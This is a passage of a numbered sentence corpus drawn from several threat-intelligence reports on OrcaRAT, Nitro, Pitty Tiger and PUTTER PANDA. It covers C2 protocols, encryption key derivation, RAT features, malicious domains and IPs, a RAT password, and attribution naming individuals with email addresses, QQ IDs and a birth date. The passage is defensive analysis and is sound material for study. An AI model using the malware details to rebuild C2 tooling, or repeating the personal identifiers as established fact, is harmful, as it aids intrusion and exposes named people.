decoding and generation of a string value ) The function above uses Windows crypto API to generate a random number of 6 bytes , then dynamically builds and appends the word \" OrcaKiller \" on to the end of this number .", "5225": "In one such example the final product was \" \\x61\\xBA\\xF4\\x44\\x52\\xF1OrcaKiller \" ( where \\x denotes hexadecimal values ) .", "5226": "Once this value has been produced , the malware begins constructing the URI .", "5227": "OrcaRAT is no exception .", "5228": "( A screenshot showing an encryption function used by OrcaRAT ) All of the values extracted from the system are encrypted using the RC4[3 ] algorithm and then base64 encoded .", "5229": "The RC4 encryption key is derived from an MD5 hash[4 ] of the randomly generated bytes concatenated with the ' OrcaKiller ' string .", "5230": "Once the data has been encrypted it is base64 encoded .", "5231": "Any forward slashes in the base64 string are replaced with a tilde - pseudo code is shown below .", "5232": "Once all of the values have been encrypted and formatted the URI has the following structure .", "5233": "( A screenshot showing the URI structure of OrcaRAT command and control activity ) The campaign ID value is constructed using a method similar to that for the encryption key .", "5234": "( A screenshot showing the generation of the first hidden string value ) It would appear that the authors did not want anybody to be able to easily see this value .", "5235": "This now gives us OrcaKiller and wHaLe .", "5236": "It would appear that our adversary has a salty sense of humour .", "5237": "Command and control As with all malware , the command and control functions reveal the true nature and intent of the operators .", "5238": "Up until now we have only determined how the malware communicates with the server .", "5239": "We will now investigate the mechanisms that the server uses to communicate and interact with the victim .", "5240": "The command and control routine in OrcaRAT appears to serve two purposes .", "5241": "Interestingly these routines are split in to two branches .", "5242": "Each branch of command and control activity is determined by the unique response from the remote server .", "5243": "Command and control takes form of a webpage .", "5244": "Unlike malware designed by the well - known Comment Crew[5 ] , this group does not hide these commands in HTML comments , but instead places them in plain view .", "5245": "( A screenshot showing OrcaRAT parsing the HTML code behind a webpage ) Upon downloading the webpage from the server the malware looks for specific sets of HTML tags .", "5246": "The first set are < P > and the terminating tag < /P>.", "5247": "Once the malware has found these tags it drops in to the first command and control function .", "5248": "The malware then extracts the payload text between the HTML tags and runs it through a decryption routine .", "5249": "The same encryption key that is sent in the URI string is used to decrypt the text .", "5250": "The second set of HTML tags allows the operator to drop the malware in to a set of remote control functions .", "5251": "This time the malware searches for the < H1 > tag that is terminated by < /H1>.", "5252": "Once the payload text between these tags has been extracted it is then decrypted using the encryption key found in the URI string .", "5253": "The payload text from this page is much smaller and ultimately points to the command function that the operator has executed .", "5254": "Each time that the URI is built it generates a new encryption key , showing that the command and control server is at least serving dynamic content .", "5255": "Given the command structure above , it is logical to assume that the command and control server requires an operator to manually issue specific commands to the victim workstation , with the default command likely being ' sleep ' .", "5256": "History has shown that malware designed in this way is usually done so to allow the operator an initial level of access to the compromised system , usually for surveying the victim and then deciding whether to deploy a more capable and valuable second stage malware implant .", "5257": "Detection Once OrcaRAT has been delivered to a victim system there are a number of ways to detect it .", "5258": "Firstly we will cover disk detection using Yara .", "5259": "The rule below will detect an OrcaRAT binary executable that has been written to a compromised machine 's disk .", "5260": "OrcaRAT can also be detected in two separate ways at the network level using a Snort or Suricata IDS rule .", "5261": "Detecting malware at different stages of connectivity can be important .", "5262": "By creating signatures with a nexus to the kill chain[6 ] we can determine which stage the intrusion has reached .", "5263": "The two signatures below will indicate whether the intrusion has reached the command and control or action - on phases .", "5264": "Snort .", "5265": "Appendix B : Related indicators", "5266": "In mid - July of this year , we noticed yet another legitimate website had been compromised by APT actors and was serving malware .", "5267": "In this case , it was a group commonly referred to as \" Nitro , \" which was coined by Symantec in its 2011 whitepaper .", "5268": "As we dug deeper , we found additional compromised legitimate websites and malware from the same group back through March of this year .", "5269": "In most instances , the malware is one commonly referred to as \" Spindest , \" though we also found \" PCClient \" and \" Farfli \" variants in use by the group .", "5270": "We do n't have enough data to say for certain that all of the malware in this blog was delivered via compromised legitimate websites .", "5271": "Historically , Nitro is known for targeted spear phishing campaigns and using Poison Ivy malware , which was not seen in these attacks .", "5272": "Since at least 2013 , Nitro appears to have somewhat modified their malware and delivery methods to include Spindest and legitimate compromised websites , as reported by Cyber Squared 's TCIRT .", "5273": "Our findings indicate they are continuing to evolve with the addition of PCClient and Farfli variants .", "5274": "The Maltego screenshot below shows the activity we describe in this blog .", "5275": "These events impacted at least the following industries , across four waves .", "5276": "A US based IT Solutions provider ; The European office of a major , US based commercial vendor of space imagery and geospatial content ; A European leader in power technologies and automation for utilities and industry ; A US based provider of medical and dental imaging systems and IT solutions .", "5277": "In July , Nitro compromised a South Korean clothing and accessories manufacturer 's website to serve malware commonly referred to as \" Spindest . \" Of all the samples we 've tied to this activity so far noted in this blog , this is the only one configured to connect directly to an IP address for Command and Control ( C2 ) .", "5278": "This IP address has been in use by this group for some time , which is interesting since they have evolved other components of their kill chain over time to ensure malware delivery , but oddly not altered their C2 infrastructure .", "5279": "It is simple for companies to block any outbound traffic to this IP , which would negate the effort Nitro put into successfully delivering the malware .", "5280": "37 AV vendors within VirusTotal properly identify it , and the PE timestamp shows the day before we saw it .", "5281": "In addition , the following three samples were found roughly a week apart from each other , possibly indicating the timing of the waves of activity .", "5282": "Table 1 The next sample we found is commonly known as PCClient , which is not malware previously tied to this group .", "5283": "We discovered this , and many of the following samples , through historic IP resolution overlap between the same domains alternately resolving to either the 223.25.233.248 or 196.45.144.12 .", "5284": "The second IP has also not been reported as tied to this group before .", "5285": "However , this shifting of IP resolutions back and forth indicates Nitro is in control of these domains .", "5286": "It also makes is fairly easy for any Infosec team to reach the same conclusion we did , which again negates their use both of a previously unreported domain and IP for C2 , as well as a new family of malware .", "5287": "25 AV vendors within VirusTotal properly classify this sample as malware .", "5288": "Its PE timestamp was 8 July , almost a week prior when we first saw it .", "5289": "Table 2 The next sample was another Spindest variant and had the same timestamp as the aforementioned PcClient sample .", "5290": "In addition , Nitro chose to use the same C2 for this sample , making it easy to both find and tie to the group .", "5291": "41 AV vendors within VirusTotal properly classify this sample as malware .", "5292": "Table 3 The next wave of activity we found took place in mid - May .", "5293": "Both samples were Spindest variants with the same PE timestamp of 15 May.", "5294": "While neither MD5s for C2 match , the aforementioned link to a post by Cyber Squared 's TCIRT did document Nitro using Spindest variants with the same file name starting late December last year .", "5295": "In that case they used the historic C2 IP we note in Table 1 in this blog .", "5296": "34 AV vendors within VirusTotal properly classify the first sample as malware , and 40 AV Vendors the second sample .", "5297": "Both of these are known Nitro Indicators of Compromise ( IOCs ) .", "5298": "In this case , the malware was a Farfli variant , again not a malware previously tied to this group .", "5299": "39 AV vendors within VirusTotal properly identify the file as malware .", "5300": "The PE timestamp on the file was 1 April , about two weeks before we saw the file .", "5301": "Continuing the activity , we discovered the actors had compromised a legitimate website belonging to an international technology company that provides Software Configuration and Change Management ( SCCM ) solutions in mid - May .", "5302": "( It is a well regarded company and partners with large companies such as Microsoft . ) Table 6 The final sample , from mid - March , was also hosted on a compromised legitimate website , this time a small , US based IT company .", "5303": "The IP resolved by the C2 URL was changed two days after we saw this file to overlap with good.myftp[.]org for a month before returning the below resolution .", "5304": "The filename matches that of the sample in Table 5 , which had a very similar third level C2 domain and the same IP resolution .", "5305": "This is also a Spindest variant with a PE timestamp of the same day we saw it .", "5306": "39 AV vendors within VirusTotal properly identify the file as malware .", "5307": "For Palo Alto Networks customers , all of these files were properly identified by WildFire as malware and all of the C2 domains are labeled as threats in both Threat Prevention and URL Filtering systems .", "5308": "Cyber espionage has been a hot topic through the last years .", "5309": "Computer attacks known as '' APT '' ( Advanced Persistent Threat ) have become widely reported and emphasized by the media , damages are now considered as real and strategic trends are moving in cyber defense .", "5310": "AIRBUS Defence & Space \u2013 CyberSecurity unit responds to such attacks for its customers every day , developing a complete range of solutions .", "5311": "Today , we decided to release publicly information on a specific group of APT attackers known as '' Pitty Tiger '' .", "5312": "This information comes directly from investigations led by our Threat Intelligence .", "5313": "Pitty Tiger is a group of attackers that have been active since at least 2011 .", "5314": "They have targeted private companies in several sectors , such as defense and telecommunications , but also at least one government .", "5315": "We have been able to track down this group of attackers and can provide detailed information about them .", "5316": "We were able to collect and reveal their '' malware arsenal '' .", "5317": "We also analyzed their technical organization .", "5318": "Our investigations indicate that Pitty Tiger has not used any 0day vulnerability so far , rather they prefer using custom malware , developed for the group 's exclusive usage .", "5319": "Our discoveries indicate that Pitty Tiger is a group of attackers with the ability to stay under the radar , yet still not as mature as other groups of attackers we monitor .", "5320": "Pitty Tiger is probably not a state-sponsored group of attackers .", "5321": "They lack the experience and financial support that one would expect from state-sponsored attackers .", "5322": "We suppose this group is opportunistic and sells its services to probable competitors of their targets in the private sector .", "5323": "We have been able to leverage several attackers profiles , showing that the Pitty Tiger group is fairly small compared to other APT groups , which is probably why we saw them work on a very limited amount of targets .", "5324": "At the end of this report , we provide indicators of compromise to help people detect current Pitty Tiger attacks .", "5325": "APT attacks follow what we call the '' APT kill chain '' .", "5326": "The kill chain describes briefly the way attackers do perform their actions .", "5327": "It can be summarized by the following scheme : The reconnaissance phase commences when an attacker selects a new target and involves the acquisition of information about that target .", "5328": "There is very little information available about this phase , and there is little data about it .", "5329": "The only way to collect information about this phase would be to already monitor all attackers ' actions at this step , which is hardly feasible .", "5330": "The longer the attackers spend time in attempting to understand their target and its online presence , the easier it will be to find efficient ways to penetrate that company 's systems .", "5331": "This reconnaissance phase is both about finding information to break into the targeted network successfully and about searching for data which could help to accelerate sensitive information isolation ( like the name of a key employee for example ) .", "5332": "This phase mostly relies on open sources from the Internet : social networks , press releases , white papers , corporate websites , search engines , but also on some active tools like vulnerability scanners etc .", "5333": "At this stage , the APT attackers have a solid knowledge of their target and its key employees .", "5334": "In fact , they can even send just a single e-mail .", "5335": "The method has one major drawback : it will also infect third parties who visit the website .", "5336": "Attackers have developed ways to avoid this .", "5337": "If their reconnaissance phase has been done effectively , they already know all IP ranges used by the target company .", "5338": "Direct attacks against servers of the target can also be a way to penetrate the target 's network .", "5339": "In case one backdoor falls , there will be others .", "5340": "They use lateral moves between machines inside the network , and look for everything they need .", "5341": "This step is very hard to detect , since they only use valid credentials and legitimate administration tools such as PsExec .", "5342": "This phase is not the end of an APT attack .", "5343": "For more information about all the APT phases , please refer to our APT Kill Chain blog post serie .", "5344": "During our regular investigations on APT cases , one particular variant of malware caught our attention , because we had not faced it before .", "5345": "We decided to spend some time to investigate around this malware and found out that it was used exclusively by a single group of attackers .", "5346": "This malware family is known as '' PittyTiger '' by the anti-virus research community .", "5347": "Our researches around this particular malware family revealed the '' Pitty Tiger '' group has been active since 2011 , yet we found other publications which could probably be attributed to the same group of attacker back in 2010 .", "5348": "This group uses other malware and tools during their APT operations , in addition to the PittyTiger RAT .", "5349": "A variant of the infamous Gh0st RAT dubbed '' Paladin '' has been used repeatedly by the PT group , together with other RATs which seem to be developed exclusively for the PT group : '' MM RAT '' ( aka Troj/Goldsun-B ) , and '' CT RAT '' .", "5350": "Another variant of Gh0st RAT named '' Leo '' has been found inactive on a c & c server .", "5351": "We also found another malware , named '' Troj/ReRol.A '' .", "5352": "Our investigation has been focused on the data we could get from these c & c servers but also on the Pitty Tiger environment .", "5353": "This whitepaper aims to expose the view we have on the group , especially on their infrastructure and capabilities .", "5354": "We hope this publication will bring further counter analysis from the research community to enrich the global common threat knowledge .", "5355": "We would advocate that this method is unwise when you want to stay furtive , and doing it from a c & c server is very surprising , to say the least .", "5356": "While the Pitty Tiger group is experienced on some aspects on its running APT campaigns , it definitely lacks some maturity here .", "5357": "It is generally the first step of the initial compromise for Pitty Tiger campaigns .", "5358": "This vulnerability affects Microsoft Office versions up to Office 2010 .", "5359": "The discovery of this '' old '' vulnerability exploitation in June 2014 could mean that the Pitty Tiger group has no direct access to 0day exploits , or not enough budgets to buy some .", "5360": "It could also mean they use their low range exploit by default because it is working on their targets and is sufficient to compromise their workstations .", "5361": "The Word document we initially found was probably a '' test '' document used by the group .", "5362": "Very few variants of Troj/ReRol.A are public .", "5363": "Once the data is deciphered , the last byte of the clear text should also be 0xc3 .", "5364": "We have been able to decrypt the communications and confirmed what is transmitted to the c & c server .", "5365": "The c & c part consists of two files : The dr.asp registers the following keywords : These two binaries were no longer available on the server .", "5366": "However , we found various files which could have been used as '' 32.exe '' in the past : The 322.exe file is a legitimate , Chinese , calc.exe tool .", "5367": "It might have been used by the attackers to perform tests .", "5368": "The 3 others binaries are RATs , which will be detailed in the next parts .", "5369": "This RAT is the origin of the attackers ' group name .", "5370": "'' PittyTiger '' is a mutex used by the malware .", "5371": "'' Pitty Tiger '' is also a string transmitted in the network communications of the RAT , as you will see in this chapter .", "5372": "This id consists of the infected computer name followed by a dash and the lower word of the disk serial id .", "5373": "We have been able to confirm that the author of those two families of malware is the same person , as will be seen in the next chapter about '' CT RAT '' .", "5374": "We have been able to acquire both the client and the server parts .", "5375": "We found two instances of the same binary with different names \u2013 32mm.exe and mm32.exe .", "5376": "This RAT seems to be an evolution of PittyTiger , since a specific server binary we found could handle both requests from CT and PittyTiger , and was indicated as compatible with PittyTiger .", "5377": "The RC4 key is the Unicode form of the requested URL .", "5378": "The c & c part is a Windows binary written in .NET", "5379": ".", "5380": "We found 2 versions : The About form gives the name of the developer ( s ) : The version of the controller which can handle both PittyTiger and CT shows the same author ( s ) : As these screenshots show , the switch between PittyTiger and CT was probably in the last semester of 2013 .", "5381": "The text can be translated , thanks to Google Translate , as : Further discussion about this author is provided in subsequent sections .", "5382": "We named this malware '' MM RAT '' at the beginning of our investigation , before we found an existing name for it , '' Troj/Goldsun-B '' according to Sophos .", "5383": "We have been able to acquire both a client and server part for it .", "5384": "It contains the '' 1.6.0 '' version number , and uses the password '' 9ol.8ik , '' to authenticate with the bots .", "5385": "The management protocol is the same as the bots protocol , with different CGI files : The bots ' answers to remote commands can be retrieved by requesting the '' Reply.sec '' file ( e.g .", "5386": "GET /httpdocs/mm/ < botid > /Reply.sec ) These network patterns might ring bells in some researcher 's minds .", "5387": "The network communication used by this binary are the same as those used by the Enfal malware , which has been used in the past by the Lurid group ( APT attackers ) and by other threat actors in China .", "5388": "An examination of the code did not reveal code similarities with the Enfal malware .", "5389": "We have been able to get both a client and server part of it .", "5390": "This malware is a variant of the infamous Gh0st RAT .", "5391": "Our specific sample uses '' ssss0 '' instead of the usual '' Gh0st '' header for network communications .", "5392": "The commands ID used in the communication protocol have also changed , but the features are quite the same .", "5393": "The configuration is directly embedded in the binary , and deciphered at runtime .", "5394": "'' EY '' could stand for '' Ernst & Young '' .", "5395": "It would not be very surprising , since a lot of different attack groups do use anti-virus vendors or other big company 's names to try to look more legitimate .", "5396": "Pitty Tiger is no exception , as detailed later in this report .", "5397": "We also found two c & c binaries , claiming to be versions 2.1 and 2.2 of the Paladin RAT controller .", "5398": "Version 2.1 answers to the '' ssss0 '' header , while version 2.2 uses the classical '' Gh0st '' header .", "5399": "Additionally to the Paladin RAT , we found another variant of Gh0st RAT , named '' Leo '' .", "5400": "Although we have found it on a c & c server of the group , there is no evidence that is has been used by the group , in opposition to Paladin which is used often by Pitty Tiger .", "5401": "Our investigation has focused on three particular c & c servers used by the group .", "5402": "These c & c servers , unlike the other c & cs used by the group , have been misconfigured .", "5403": "Once parsed and dumped , it provided us with more insight .", "5404": "We found several domains used by the Pitty Tiger group , the most interesting ones being detailed in this chapter .", "5405": "Pitty Tiger , like other APT attackers , often use anti-virus '' familiar names '' when registering domains or creating subdomains .", "5406": "Some examples can be avstore.com.tw , sophos.skypetm.com.tw , symantecs.com.tw , trendmicro.org.tw etc .", "5407": "The registration information for this domain has been the same since 2013-06-04 : This information has been used to register another domain , skypetm.com.tw , which has also been used by the Pitty Tiger group .", "5408": "Our research also led us to the discovery of four different malware families connected to subdomains of avstore.com.tw : This domain has shown two different WHOIS entries through time : The most recent registration information is also used for avstore.com.tw .", "5409": "There is an increase in the registrations from 2010 on .", "5410": "All the e-mail addresses used are connected to the Pitty Tiger group .", "5411": "Mapping the victims of such a targeted campaign is not an easy task .", "5412": "We have found the Pitty Tiger group to be very active against one particular private company from the defense industry and one academic network of a government , , yet we think it was done to be used as a proxy for some of the group 's operations .", "5413": "We have also found some connections from other companies to the c & c servers , yet we did not find evidence that they were real victims .", "5414": "These alleged victims do work in different sectors and are located mostly in European countries .", "5415": "It might be surprising to see a company specialized in web development here , yet it has built websites for interesting potential targets .", "5416": "We have to mention that we only had access to three of the several attackers ' servers .", "5417": "Therefore , we suppose the Pitty Tiger group could have more targets than what we could confirm .", "5418": "During the course of our investigations , we discovered a RAR archive on the attacker 's server containing 5 Word documents and one small C source code .", "5419": "These documents belong to the defense company which has been compromised .", "5420": "The documents were still exhibiting comments from various users , showing it was an ongoing work and not old documents .", "5421": "This other company could be a partner or competitor .", "5422": "Since we were unable to determine the intended use of this specific document , we can only suppose that it could be used to provide commercial advantages to competitors of that company , or used by a foreign state .", "5423": "During our investigation , we found out interesting information about the Pitty Tiger group itself .", "5424": "After analyzing the various collected elements , we have tried to draw a portrait of this particular threat .", "5425": "We have been able to get all the RDP connections logs to one c & c server : These connections are either VPS or dynamic IP addresses , mostly from China .", "5426": "This IP address belongs to an ADSL dynamic pool in the Wuhan area ( Hubei's provincial capital ) .", "5427": "There are 11 IP addresses from Chinese dynamic ADSL ranges : 9 from Fuqing ( Fujian province ) , one from Fuzhou ( Fujian 's province capital ) and one from Nanchang ( Jiangxi 's province capital ) .", "5428": "The last one came from a VPS instance located in Los Angeles ( California , USA ) but purchased by a China based VPS provider XeVPS which belong to the AS38197 ( Sun Network Hong Kong Limited ) .", "5429": "This information was still available when we got access to the c & c server .", "5430": "The c & c IP address , 198.100.113.27 , can be seen there .", "5431": "Other log files showed that '' Toot '' is using virtual machines for his tests .", "5432": "We can also see the system : Microsoft Windows XP SP3 .", "5433": "The '' P '' field is the language ID .", "5434": "1028 means '' Chinese traditional '' .", "5435": "We have also seen tests run by '' toot '' with a language ID of 2052 , which is '' Chinese simplified '' .", "5436": "The '' M '' field is probably used for versioning .", "5437": "It is a hardcoded string in the binary .", "5438": "Here is a follow-up of the commands launched by the bot controller , in a standard command-line shell : The attacker goes on like this , using his tools , and then ends the communication with this RAT on that computer .", "5439": "In addition to all information already shown , we saw Toot connect to an account on a cloud service named '' Baidu Drive '' .", "5440": "The e-mail address linked to this account is dyanmips @ qq.com ( QQ-ID : 2589315828 ) .", "5441": "We could find traces of two other e-mail accounts associated to Toot , ciscodyanmips @ qq.com ( QQ ID : 204156335 ) and ciscodynamips @ qq.com ( QQ ID : 1878836793 ) .", "5442": "We did not find more information about user '' Toot '' , yet we miss Chinese language capabilities .", "5443": "The controller part of CT RAT/PittyTiger RAT revealed the following '' about '' information , once translated from Chinese to English language : CT console ( compatible pittytiger ) v1.3 2013.12 by Trees and snow We believe this translation of the author 's name might not be accurate due to the use of automated translation tools .", "5444": "Moreover , we have strong suspicions that there is not a single individual nicknamed '' Trees and snow '' but rather two programmers nicknamed '' Trees '' and '' Snow '' .", "5445": "'' Trees '' could also be '' Cold '' .", "5446": "We noticed that the symbol for this word is translated differently according to the context it is used in .", "5447": "Once again , we lack Chinese language skills .", "5448": "We identify the two nicknames on the current campaign as Automn Snow ( \u79cb\u96ea ) and Cold Air Kiss ( \u98ce\u543b\u5bd2 ) .", "5449": "While we are confident that these people are indeed the developers of both PittyTiger and CT RAT malware , we are not sure they belong to the PittyTiger group .", "5450": "These developers might just have been hired to develop these RATs .", "5451": "They might also just be selling it to the PittyTiger group .", "5452": "There is no trace of usage from other attacking groups , we believe the PittyTiger RAT is exclusively used by this group of attackers .", "5453": "According to indicators we gathered and threat activities profiling we have some hypothesis on the way the group is conducting its operations .", "5454": "We have strong evidence of a bot operator position .", "5455": "We identify one nickname for this position , the user known as TooT .", "5456": "As we did not see other nickname , we think that TooT is one person and not a group of persons .", "5457": "We also identified a malware development position .", "5458": "We identified two nicknames for this position on the current campaign , Automn Snow ( \u79cb\u96ea ) and Cold Air Kiss ( \u98ce\u543b\u5bd2 ) .", "5459": "Yet we are unsure that they belong to the group , they might just be a third party providing or selling their malware .", "5460": "We have a strong suspicion of a coordinator position , which coordinates the bot operator , provides him with some logistics support ( weaponized document , tools\u2026 ) and reviews the programmers work .", "5461": "This position could imply a communication channel with another manager .", "5462": "We named this position 'Chen ' , in relation with several references of this common Chinese name in c & c WHOIS and other investigation materials .", "5463": "We have some suspicion of a customer relationship manager position that may act as an interface between a customer and Chen .", "5464": "We named this position 'Lilly ' .", "5465": "We have been lucky enough to get the controller part of Pitty Tiger and CT RAT , and even to get a kind of hybrid controller made for CT RAT but also supporting Pitty Tiger .", "5466": "We suppose that the CT RAT is the new evolution of Pitty Tiger and that it will replace Pitty Tiger in the following months .", "5467": "The presence of a Chinese version of '' calc.exe '' , the official calculator provided in Microsoft Windows , is interesting .", "5468": "In addition to those tools , we found some interesting scripts .", "5469": "This file is 67320 lines long , and uses 5610 different passwords for each of 12 users contained in this file .", "5470": "The user names are clearly the result from a user enumeration and are dedicated to a particular French victim .", "5471": "The passwords listed in this file are either build from several campaigns or from the current campaign .", "5472": "A lot of passwords are related to the targeted company and might be previous passwords from users .", "5473": "We have also discovered a pack of files which can be used to trigger an Internet Explorer vulnerability ( CVE-2014-0322 ) .", "5474": "The date of these files , namely Tope.swf and index.html , was 2014/02/18 , a few days after the revelation of existing exploits in the wild used in APT attacks .", "5475": "We do not know if the Pitty Tiger group used this exploit or not , but found no trace indicating they did .", "5476": "A lot of different attackers seem to have used that vulnerability since .", "5477": "Determining who is exactly behind an APT campaign is difficult .", "5478": "We tried to extract different technical indicators , together with contextual elements .", "5479": "Yet some IP addresses in the USA and in Hong Kong have also been found ; All the items listed in this chapter are strong indicators that the attackers might be Chinese .", "5480": "Pitty Tiger is a group of attackers that have been active since at least 2011 .", "5481": "Pitty Tiger is probably not a state-sponsored group of attackers .", "5482": "The attackers lack the experience and financial support that one would expect from state-sponsored attackers .", "5483": "We suppose this group is opportunistic and sells its services to probable competitors of their targets in the private sector .", "5484": "One governmental network has been targeted by the group , yet we do not have any evidence of the purpose of this attack .", "5485": "We suppose this particular attack has been executed to provide a usable bounce for the group .", "5486": "The campaign we studied has been largely focused on one particular target .", "5487": "We suspect the Pitty Tiger group to work according to an opportunistic business model : this group might offer its services to third parties from the private sector .", "5488": "This group seems to be very small compared to other APT groups .", "5489": "We have leveraged several profiles and could identify some attackers to a certain extent .", "5490": "We believe this group might keep working as it is now , with limited budgets , or grow to extend its attacking campaign capabilities .", "5491": "This list of indicators is provided in order to help people detect Pitty Tiger APT campaign .", "5492": "Domains used by the Pitty Tiger group : ( please note several subdomains are used , as seen in the report )", "5493": "In May 2014 , the U.S. Department of Justice charged five Chinese nationals for economic espionage against U.S. corporations .", "5494": "The five known state actors are officers in Unit 61398 of the Chinese People 's Liberation Army ( PLA ) .", "5495": "In response , the Chinese government stated that the claims were '' absurd '' and based on '' fabricated facts '' .", "5496": "China then went even further , stating '' The Chinese government , the Chinese military and their relevant personnel have never engaged or participated in cyber theft of trade secrets .", "5497": "'' We believe that organizations , be they governments or corporations , global or domestic , must keep up the pressure and hold China accountable until lasting change is achieved .", "5498": "Not only did the U.S. Government offer in its criminal indictment the foundation of evidence designed to prove China 's culpability in electronic espionage , but also illustrated that the charges are only the tip of a very large iceberg .", "5499": "Those reading the indictment should not conclude that the People 's Republic of China ( PRC ) hacking campaign is limited to five soldiers in one military unit , or that they solely target the United States government and corporations .", "5500": "Rather , China 's decade-long economic espionage campaign is massive and unrelenting .", "5501": "Through widespread espionage campaigns , Chinese threat actors are targeting companies and governments in every part of the globe .", "5502": "At CrowdStrike , we see evidence of this activity first-hand as our services team conducts Incident Response investigations and responds to security breaches at some of the largest organizations around the world .", "5503": "We have first-hand insight into the billions of dollars of intellectual property systematically leaving many of the largest corporations - often times unbeknownst to their executives and boards of directors .", "5504": "The campaign that is the subject of this report further points to espionage activity outside of Unit 61398 , and reveals the activities of Unit 61486 .", "5505": "Unit 61486 is the 12th Bureau of the PLA 's 3rd General Staff Department ( GSD ) and is headquartered in Shanghai , China .", "5506": "The CrowdStrike Intelligence team has been tracking this particular unit since 2012 , under the codename PUTTER PANDA , and has documented activity dating back to 2007 .", "5507": "The report identifies Chen Ping , aka cpyy , and the primary location of Unit 61486 .", "5508": "This particular unit is believed to hack into victim companies throughout the world in order to steal corporate trade secrets , primarily relating to the satellite , aerospace and communication industries .", "5509": "With revenues totaling $ 189.2 billion in 2013 , the satellite industry is a prime target for espionage campaigns that result in the theft of high-stakes intellectual property .", "5510": "While the gains from electronic theft are hard to quantify , stolen information undoubtedly results in an improved competitive edge , reduced research and development timetables , and insight into strategy and vulnerabilities of the targeted organization .", "5511": "Parts of the PUTTER PANDA toolset and tradecraft have been previously documented , both by CrowdStrike , and in open source , where they are referred to as the MSUpdater group .", "5512": "This report contains details on the tactics , tools , and techniques used by PUTTER PANDA , and provides indicators and signatures that can be leveraged by organizations to protect themselves against this activity .", "5513": "Our Global Intelligence Team actively tracks and reports on more than 70 espionage groups , approximately half of which operate out of China and are believed to be tied to the Chinese government .", "5514": "This report is part of our extensive intelligence library and was made available to our intelligence subscribers in April 2014 , prior to the US Government 's criminal indictment and China 's subsequent refusal to engage in a constructive dialog .", "5515": "Targeted economic espionage campaigns compromise technological advantage , diminish global competition , and ultimately have no geographic borders .", "5516": "We believe the U.S. Government indictments and global acknowledgment and awareness are important steps in the right direction .", "5517": "In support of these efforts , we are making this report available to the public to continue the dialog around this ever-present threat .", "5518": "CrowdStrike has been tracking the activity of a cyber espionage group operating out of Shanghai , China , with connections to the People 's Liberation Army Third General Staff Department ( GSD ) 12th Bureau Military Unit Cover Designator ( MUCD ) 61486 , since 2012 .", "5519": "The attribution provided in this report points to Chen Ping , aka cpyy ( born on May 29 , 1979 ) , as an individual responsible for the domain registration for the Command and Control ( C2 ) of PUTTER PANDA malware .", "5520": "In addition to cpyy , the report identifies the primary location of Unit 61486 .", "5521": "PUTTER PANDA is a determined adversary group , conducting intelligence-gathering operations targeting the Government , Defense , Research , and Technology sectors in the United States , with specific targeting of the US Defense and European satellite and aerospace industries .", "5522": "The PLA 's GSD Third Department is generally acknowledged to be China 's premier Signals Intelligence ( SIGINT ) collection and analysis agency , and the 12th Bureau Unit 61486 , headquartered in Shanghai , supports China 's space surveillance network .", "5523": "Domains registered by Chen Ping were used to control PUTTER PANDA malware .", "5524": "These domains were registered to an address corresponding to the physical location of the Shanghai headquarters of 12th Bureau , specifically Unit 61486 .", "5525": "This report contains additional details on the tactics , tools , and techniques used by PUTTER PANDA , and provides indicators and signatures that can be leveraged by organizations to protect themselves against this activity .", "5526": "\u2794 \u0007Putter Panda is a cyber espionage actor that conducts operations from Shanghai , China , likely on behalf of the Chinese People 's Liberation Army ( PLA ) 3rd General Staff Department 12th Bureau Unit 61486 .", "5527": "This unit is supports the space based signals \u0007 intelligence ( SIGINT ) mission .", "5528": "\u2794 \u0007The 12th Bureau Unit 61486 , headquartered in Shanghai , is widely accepted to be China 's primary SIGINT collection and analysis agency , supporting China 's space surveillance network .", "5529": "\u2794 \u0007This is a determined adversary group , conducting intelligence- gathering operations targeting the Government , Defense , Research , and Technology sectors in the United States , with specific targeting of space , aerospace , and communications .", "5530": "\u2794 \u0007CrowdStrike identified Chen Ping , aka cpyy , a suspected member of the PLA responsible for procurement of the domains associated with operations conducted by Putter Panda .", "5531": "\u2794 \u0007The group has been operating since at least 2007 and has been observed heavily targeting the US Defense and European satellite and aerospace industries .", "5532": "\u2794 \u0007There is infrastructure overlap with Comment Panda , and evidence of interaction between actors tied to both groups .", "5533": "There are several pieces of evidence to indicate that the activity tracked by CrowdStrike as PUTTER PANDA is attributable to a set of actors based in China , operating on behalf of the Chinese People 's Liberation Army ( PLA ) .", "5534": "Specifically , an actor known as cpyy ( Chen Ping ) appears to have been involved in a number of historical PUTTER PANDA campaigns , during which time he was likely working in Shanghai within the 12th Bureau , 3rd General Staff Department ( GSD ) .", "5535": "PUTTER PANDA has several connections to actors and infrastructure tied to COMMENT PANDA , a group previously attributed to Unit 61398 of the PLA .", "5536": "Table 1 shows the domains that appear to have been registered by these actors , and the original email address used where known .", "5537": "The most significant finding is that an actor known as cpyy appears to have registered a significant number of C2 domains .", "5538": "This actor is discussed in the next section .", "5539": "Many of the domains have had their registrant information changed , likely in an attempt to obfuscate the identity of the operators .", "5540": "For instance , several domains originally registered by cpyy had their email address updated to van.dehaim @ gmail.com around the end of 2009 ; for siseau.com the change occurred between July 2009 and November 2009 , and for vssigma.com , the change occurred between August 2009 and December 2009 .", "5541": "Historical registrant information for anfoundation.us , rwchateau.com , and succourtion.org was not available prior to 2010 , but it is likely that these domains were also originally registered to a personally attributable email account .", "5542": "Similarly , several domains registered to mike.johnsonmj @ yahoo.com have had their registrant email updated during March 2014 ( see Table 2 ) .", "5543": "These registrant changes may indicate an increased awareness of operational security ( OPSEC ) from the PUTTER PANDA actors .", "5544": "The recent changes to the domains shown in Table 2 may indicate that the operators are preparing new campaigns that make use of this infrastructure , or they are attempting to disassociate all these .", "5545": "Although no attributable information was found on the email addresses associated with the domains described above ( aside from cpyy and httpchen \u2013 see below ) , several other domains were found to have been registered by some of these addresses .", "5546": "domains from a single email address , perhaps due to OPSEC concerns or issues with the specific email account .", "5547": "The subdomains associated with these domains via DNS records , along with some of the domain names themselves , point to some areas of interest for the PUTTER PANDA operators ( see also Droppers in the following Technical Analysis section ) : \u2022 Space , satellite , and remote sensing technology ( particularly within Europe ) ; \u2022 Aerospace , especially European aerospace companies ; \u2022 Japanese and European telecommunications .", "5548": "It is likely that PUTTER PANDA will continue to attack targets of this nature in future intelligence- gathering operations .", "5549": "Based on passive DNS records , several PUTTER PANDA associated domains have resolved to IP address 100.42.216.230 : Additionally , several subdomains of ujheadph.com resolved to this IP : Another subdomain of ujheadph.com has been observed in connection with distinctive traffic originating from the 3PARA RAT ( described below ) , making it probable that this domain is also associated with PUTTER PANDA .", "5550": "The decipherment.net domains resolved to this IP address from 11 October 2012 to at least 25 February 2013 , and the 